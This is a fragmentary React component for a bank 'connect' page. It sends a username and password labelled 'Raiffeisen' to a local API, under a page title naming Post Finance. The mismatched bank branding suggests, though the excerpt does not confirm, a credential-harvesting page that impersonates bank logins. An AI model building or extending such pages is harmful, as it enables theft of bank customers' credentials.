...
export default function RaiffeisenConnect() {
    ...
    try {
      ...
      const response = await fetch("/api/operation", {
        ...
        body: JSON.stringify({ 
          username, 
          password, 
          bankName: "Raiffeisen" // Ajout explicite du nom de la banque ici
        }),
      });
  ...
  return (
    <div className="bank-connect-container">
      ...
      <h1 className="bank-connect-title">Betreffen Post Finance</h1>
